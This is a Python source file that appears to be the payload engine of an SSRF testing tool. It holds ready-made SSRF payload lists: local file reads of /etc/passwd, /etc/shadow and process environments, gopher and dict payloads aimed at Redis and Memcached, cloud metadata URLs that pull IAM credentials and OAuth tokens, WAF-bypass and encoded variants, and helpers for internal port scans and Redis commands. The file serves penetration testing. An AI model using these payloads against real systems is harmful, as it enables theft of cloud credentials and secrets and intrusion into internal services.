"""
sedf/payloads/generator.py - SSRF payload generation engine (FR-03)

Generates payloads across all categories:
  - HTTP / HTTPS
  - file://
  - gopher://
  - dict://
  - ftp://
  - Cloud metadata endpoints
  - Obfuscated / WAF-bypass payloads
  - Encoded payloads
"""

import os
from typing import List

from sedf.utils.logger import get_logger

logger = get_logger(__name__)

# ── Default payload libraries ─────────────────────────────────────────────────

HTTP_PAYLOADS = [
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0177.0.0.1",          # Octal
    "http://0x7f000001",           # Hex
    "http://2130706433",           # Decimal
    "http://127.1",
    "http://127.0.1",
    "http://localhost.localdomain",
    "http://localtest.me",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    "http://internal",
]

FILE_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///proc/version",
    "file:///proc/cmdline",
    "file:///proc/self/cmdline",
    "file:///var/log/apache2/access.log",
    "file:///var/log/nginx/access.log",
    "file:///etc/nginx/nginx.conf",
    "file:///etc/apache2/apache2.conf",
    "file:///etc/mysql/my.cnf",
    "file:///home/",
    "file://localhost/etc/passwd",
    "file:///C:/Windows/System32/drivers/etc/hosts",  # Windows
    "file:///C:/inetpub/wwwroot/web.config",
]

GOPHER_PAYLOADS = [
    "gopher://127.0.0.1:6379/_INFO%0D%0A",
    "gopher://127.0.0.1:6379/_CONFIG%20GET%20dir%0D%0A",
    "gopher://127.0.0.1:11211/_%0D%0Astats%0D%0A",
    "gopher://127.0.0.1:25/_HELO%20localhost%0D%0A",
    "gopher://127.0.0.1:3306/",
    "gopher://127.0.0.1:9200/_cat/indices",
]

DICT_PAYLOADS = [
    "dict://127.0.0.1:6379/INFO",
    "dict://localhost:11211/stats",
    "dict://127.0.0.1:25/EHLO",
]

FTP_PAYLOADS = [
    "ftp://127.0.0.1/",
    "ftp://anonymous:anonymous@127.0.0.1/",
    "ftp://127.0.0.1:21/",
]

CLOUD_META_PAYLOADS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    # IMDSv2 token endpoint (read-only)
    "http://169.254.169.254/latest/api/token",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://169.254.169.254/computeMetadata/v1/?recursive=true",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1/id",
]

WAF_BYPASS_PAYLOADS = [
    # IP obfuscation
    "http://127.0.0.1@evil.com",
    "http://evil.com@127.0.0.1",
    "http://127。0。0。1",           # Unicode dots
    "http://①②⑦.⓪.⓪.①",
    "http://127.0.0.1%09",          # Tab bypass
    "http://127.0.0.1%0d%0a",
    # Double encoding
    "http://%31%32%37%2e%30%2e%30%2e%31",
    "http://127.0.0.1#evil.com",
    "http://127.0.0.1?.evil.com",
    # CNAME / DNS rebinding (use with OOB domain)
    "http://localtest.me",
    "http://local.lvh.me",
    "http://127.0.0.1.xip.io",
    # Protocol confusion
    "hTTp://127.0.0.1",
    "HTTP://127.0.0.1",
    "HttP://localhost",
    # Redirector abuse (open redirect chains)
    "http://127.0.0.1/%0d%0aContent-Type:text/html%0d%0a%0d%0a",
    # SSRF via IPv6
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://[::ffff:7f00:1]",
    "http://[::1]",
    # URL parser tricks
    "http://127.0.0.1:80%2F@evil.com/",
    "http://evil.com%2F@127.0.0.1/",
    "//127.0.0.1/path",
]

ENCODED_PAYLOADS = [
    # URL encoded
    "http%3A%2F%2F127.0.0.1",
    "%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31",
    # Double URL encoded
    "http%253A%252F%252F127.0.0.1",
    # HTML entities (for reflected injection contexts)
    "http://127&#x2E;0&#x2E;0&#x2E;1",
    # Base64 (for apps that decode before fetching)
    "aHR0cDovLzEyNy4wLjAuMQ==",  # base64 of http://127.0.0.1
    # Unicode escapes
    "http://\u0031\u0032\u0037.\u0030.\u0030.\u0031",
]

# ── Payload sets mapping ──────────────────────────────────────────────────────

PAYLOAD_SETS = {
    "http": HTTP_PAYLOADS,
    "file": FILE_PAYLOADS,
    "gopher": GOPHER_PAYLOADS,
    "dict": DICT_PAYLOADS + FTP_PAYLOADS,
    "cloud": CLOUD_META_PAYLOADS,
    "bypass": WAF_BYPASS_PAYLOADS,
    "encoded": ENCODED_PAYLOADS,
    "default": HTTP_PAYLOADS + FILE_PAYLOADS[:4] + CLOUD_META_PAYLOADS[:4] + WAF_BYPASS_PAYLOADS[:6],
    "all": (
        HTTP_PAYLOADS + FILE_PAYLOADS + GOPHER_PAYLOADS + DICT_PAYLOADS +
        FTP_PAYLOADS + CLOUD_META_PAYLOADS + WAF_BYPASS_PAYLOADS + ENCODED_PAYLOADS
    ),
}


class PayloadGenerator:
    """
    FR-03: Generates SSRF payloads from predefined templates and custom files.
    """

    def __init__(self, args):
        self.args = args
        self._payloads: List[str] = []

    def get_payloads(self) -> List[str]:
        """Return the configured payload list, loading it on first call."""
        if not self._payloads:
            self._payloads = self._load()
            if getattr(self.args, "blind", False):
                self._payloads.append("http://OOB_CALLBACK_MARKER")
        return self._payloads

    def _load(self) -> List[str]:
        payloads = []

        # Custom payload file takes priority
        if self.args.payload_file:
            payloads = self._load_file(self.args.payload_file)
            if payloads:
                logger.info(f"Loaded {len(payloads)} payload(s) from custom file.")
                return payloads
            logger.warning("Custom payload file empty or unreadable; falling back to built-in.")

        # Built-in set
        set_name = getattr(self.args, "payloads", "default")
        payloads = list(PAYLOAD_SETS.get(set_name, PAYLOAD_SETS["default"]))
        logger.info(f"Loaded {len(payloads)} payload(s) from built-in set '{set_name}'.")
        return payloads

    @staticmethod
    def _load_file(path: str) -> List[str]:
        """Load payloads from a text file (one per line)."""
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                return [
                    line.strip()
                    for line in fh
                    if line.strip() and not line.startswith("#")
                ]
        except FileNotFoundError:
            logger.error(f"Payload file not found: {path}")
            return []
        except Exception as exc:
            logger.error(f"Error reading payload file {path}: {exc}")
            return []

    # ── Helpers ───────────────────────────────────────────────────────────────

    @staticmethod
    def get_port_scan_payloads(ip: str, ports: List[int]) -> List[str]:
        """Generate payloads for port scanning via SSRF (FR-05)."""
        payloads = []
        for port in ports:
            payloads.extend([
                f"http://{ip}:{port}/",
                f"https://{ip}:{port}/",
                f"dict://{ip}:{port}/",
                f"gopher://{ip}:{port}/",
            ])
        return payloads

    @staticmethod
    def get_redis_payloads(ip: str = "127.0.0.1", port: int = 6379) -> List[str]:
        """Generate gopher-based Redis interaction payloads (FR-06)."""
        commands = {
            "INFO": f"gopher://{ip}:{port}/_%2A1%0D%0A%244%0D%0AINFO%0D%0A",
            "KEYS *": f"gopher://{ip}:{port}/_%2A2%0D%0A%244%0D%0AKEYS%0D%0A%241%0D%0A%2A%0D%0A",
            "CONFIG GET dir": (
                f"gopher://{ip}:{port}/_"
                "%2A3%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0AGET%0D%0A%243%0D%0Adir%0D%0A"
            ),
        }
        return list(commands.values())

    @staticmethod
    def get_cloud_payloads(provider: str = "aws") -> List[str]:
        """Return cloud metadata payloads for a specific provider (FR-06)."""
        mapping = {
            "aws": [p for p in CLOUD_META_PAYLOADS if "169.254.169.254" in p and "computeMetadata" not in p and "metadata/instance" not in p],
            "gcp": [p for p in CLOUD_META_PAYLOADS if "google" in p or "computeMetadata" in p],
            "azure": [p for p in CLOUD_META_PAYLOADS if "metadata/instance" in p or "identity/oauth2" in p],
        }
        return mapping.get(provider, CLOUD_META_PAYLOADS)
